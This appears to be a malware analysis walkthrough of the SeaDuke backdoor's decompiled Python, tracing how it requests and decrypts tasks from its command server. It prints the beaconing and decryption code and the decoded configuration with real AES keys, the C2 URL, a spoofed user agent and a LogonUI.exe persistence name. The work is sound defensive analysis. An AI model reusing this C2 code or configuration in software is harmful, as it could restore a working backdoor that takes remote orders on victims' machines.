# how does seaduke fetch instructions from the mothership?
`main()` asks `networkHandleKlass` to get tasks:
```python
def main():
    ...
    networkTasks=networkHandleKlass.get_tasks()


class NetworkHandlerKlass(object):
    def get_tasks(self):
        ...
```
this instantiates a `CryptoKlass` object called `pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy`.
```python
class CryptoKlass(object):

    def __init__(self,v_crypto_aes_key,v_crypto_aes_iv,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
        if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('b64',True):
            v_crypto_aes_key=base64_b64decode(v_crypto_aes_key)
            v_crypto_aes_iv=base64_b64decode(v_crypto_aes_iv)
        self.__aes_key=v_crypto_aes_key
        self.__aes_iv=v_crypto_aes_iv
```
it then does three inner loops:
```python
class NetworkHandlerKlass(object):

    def get_tasks(self):
        ...
        for _ in range(botKlass.total_hosts):
            for _ in range(botKlass.total_transports):
                for _ in range(3):
                    networkTasks=[]
                    try:
                        response_data = self.__send_request(id=botKlass.bot_id)
                        decoded_response = self.decode_data(response_data)  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy renamed to decoded_response
                        if not 'tasks' in decoded_response:
                            return []
                        decoded_tasks = decoded_data['tasks']  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD renamed to decoded_tasks
                        for networkTask in decoded_tasks:
                            if 'task_data' in networkTask and networkTask['task_data']:
                                networkTask['task_data'] = my_cryptoklass.decode_data(networkTask['task_data'])
                                networkTasks.append(networkTask)
                        botKlass.is_first_request=False
                        return networkTasks
```
## request information from remote server
this is a critical part since it is where botKlass requests and receives instructions with `NetworkHandlerKlass.__send_request` method:
```python
response_data=self.__send_request(id=botKlass.bot_id)

class BotKlass(object):

    def __init__(self):
        self.__settings=self.__load_settings()
        ...
        self.__bot_id=self.__settings['bot_id']


class NetworkHandlerKlass(object):
    ...
    def __send_request(self, **x):
        url = x.pop('url', self.url)  #  Syntax : dict.pop(key, def) Parameters : key : The key whose key-value pair has to be returned and removed. def : The default value to return if specified key is not present. 
        encoded_cookie_data = None
        res = None
        
        if x:
            encoded_cookie_data=self.__encode_cookie(x)
        
        if botKlass.current_transport=='wininet':  # windows interface
            pass
            p = HttpKlass(url, self.user_agent)
            res = p.send_request(encoded_cookie_data, self.referer)
        else:
            pass
            
            header = urllib2_build_opener()
            header.addheaders=[('User-agent',self.user_agent)]
            
            if encoded_cookie_data:
                header.addheaders.append(('Cookie', encoded_cookie_data))
            
            if self.referer:
                pass

            d = header.open(url)
            res = d.read()
            e = d.info().get('Content-Encoding')
            if e:
                res = CryptoKlass.unpack_data(res, e)
        return res
```
### what is the `url`?
since `NetworkHandlerKlass` wasnt provided with an url, we rely on its url.
```python
class NetworkHandlerKlass(object):

    def __init__(self,**foo):
        self.__url = foo.get('url', None)

    @property
    def url(self):
        return self.__url if self.__url else botKlass.current_host
```
since `self.__url=None`, we look at `botKlass.current_host`.
```python
class BotKlass(object):

    def __init__(self):
        self.__settings = self.__load_settings()
    
    @property
    def current_host(self):
        return self.__settings['host_scripts'][self.__current_host_index]
```
`botKlass.current_host` requires `self.__settings` to execute `self.__load_settings()`:
```python
class BotKlass(object):
    ...
    def __load_settings(self):
        settings_file_path = self.settings_file_path
        d = {}  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQeD replaced to d
        if not os_path.exists(settings_file_path):
            d = get_default_settings()
        else:
            try:
                with open(settings_file_path,'rb')as settings_file:
                    bot_settings = get_default_settings()
                    v_crypto_aes_key = bot_settings['keys']['aes']
                    v_crypto_aes_iv = bot_settings['keys']['aes_iv']
                    c = CryptoKlass(v_crypto_aes_key,v_crypto_aes_iv)
                    k = c.decrypt(settings_file.read())
                    d = json_loads(k)
            except Exception as e:
                pass
                os_remove(settings_file_path)
                d = get_default_settings()
        return d
```
this calls the following for `settings_file_path`, which creates a file path based on the bot's `key_id` (the key_id is defined in `bot_settings`):
```python
class BotKlass(object):
    ...
    @property
    def settings_file_path(self):
        key_id = get_default_settings()['key_id']  # hardcoded as P4BNZR0
        if v_sys_platform.startswith('win'):
            w ='tmp' + key_id.lower()
        else:
            w ='.'+key_id
        y = tempfile_gettempdir()
        if v_sys_platform.startswith('win'):
            z=ctypes.windll.shell32.SHGetFolderPathW
            z.argtypes=[ctypes.wintypes.HWND,ctypes.c_int,ctypes.wintypes.HANDLE,ctypes.wintypes.DWORD,ctypes.wintypes.LPCWSTR]
            a=ctypes.wintypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
            z(0,0x1C,0,0,a)
            y=a.value
        return os_path.join(y, w)
```
which calls `get_default_settings()`, which returns a [dict called `bot_settings`](https://github.com/mynameisvinn/Seaduke/blob/master/bot_settings.md):
```python
bot_settings=json_loads(zlib_decompress(base64_b64decode('eJx1kF1PwjAUhv/K0iuNpiUMg8Fw4QSTAfFrQQ3GNN12Nua2dpyWj0n877ZAvPOqzTnP+77nnD3JCtSG41ryFCrRkoHXufRICa223z0R4F4yDb/i7wVb7NLx1XTUfVf6fRXG4xTvdq1fr0ZRNHub9IP70ldDYvVWxouNUyYVzKdhcVHfvkbTWbf/2Juw+fNwSH4ctjaqUiLlGowpZH7MhB1wKWpw8pnKlZyH1NYOvk3zX8uODwa4yAygbWei0uAylsrupxMsGuPsP8jSmGbAWK1kYRRS3UqaSIZa02bZkE8rQcgADy4HWFt6u93STCQQK1XSRNXMRa41IBc5SOPQqDAQCGQ+9em1dxZYshZYehHgBvDGO+Vqi8UCqcKcnZPjrXmROoenXvCweOm4IkgRV3ab04H+FvoFdgWNdw==')))

def get_default_settings():
    return bot_settings
```
if we look at the dict `bot_settings` we see the following:
```python
```python
{'first_run_delay': 0,
'keys': {'aes': 'KIjbzZ/ZxdE5KD2XosXqIbEdrCxy3mqDSSLWJ7BFk3o=', 'aes_iv': 'cleUKIi+mAVSKL27O4J/UQ=='},
'autoload_settings': {'exe_name': 'LogonUI.exe', 'app_name': 'LogonUI.exe', 'delete_after': False},
'host_scripts': ['http://monitor.syn.cn/rss.php'],
'referer': 'https://www.facebook.com/',
'user_agent': 'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
'key_id': 'P4BNZR0',
'enable_autoload': False}
```
since we were interested in:
```python
class BotKlass(object):

    def __init__(self):
        self.__settings = self.__load_settings()
    
    @property
    def current_host(self):
        return self.__settings['host_scripts'][self.__current_host_index]
```
we now know `url` points to http://monitor.syn.cn/rss.php.

## we have the url, now what?
to refresh, we were evaluating `self.__send_request()`:
```python
class NetworkHandlerKlass(object):
    def get_tasks(self):
        ...
		response_data=self.__send_request(id=botKlass.bot_id)
        ...

    def __send_request(self, **x):  # https://github.com/pan-unit42/iocs/blob/29cfa76babf29d1eb754a1706526b5aa97d4607b/seaduke/decompiled.py#L1446
        ...
        else:
            pass
            header = urllib2_build_opener()
            header.addheaders=[('User-agent',self.user_agent)]
            
            if encoded_cookie_data:
                header.addheaders.append(('Cookie', encoded_cookie_data))
            
            if self.referer:
                pass

            d = header.open(url)
            res = d.read()
            e = d.info().get('Content-Encoding')
            if e:
                res = CryptoKlass.unpack_data(res,e)
        return res
```
when we ask `NetworkHandlerKlass` to `__send_request`, it will receive some packet from http://monitor.syn.cn/rss.php and decrypt it with `CryptoKlass`.
